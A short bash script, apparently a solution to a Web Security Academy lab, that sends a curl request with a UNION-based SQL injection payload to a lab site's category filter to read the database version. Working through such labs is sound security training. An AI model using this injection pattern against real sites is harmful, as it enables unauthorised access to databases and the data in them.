#!/bin/bash
if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain";
	exit 1;
fi
url="https://$1.web-security-academy.net";

curl \
	-G "$url/filter" \
	--data-urlencode "category=Pets' AND 1=0 UNION (SELECT VERSION(), null) -- "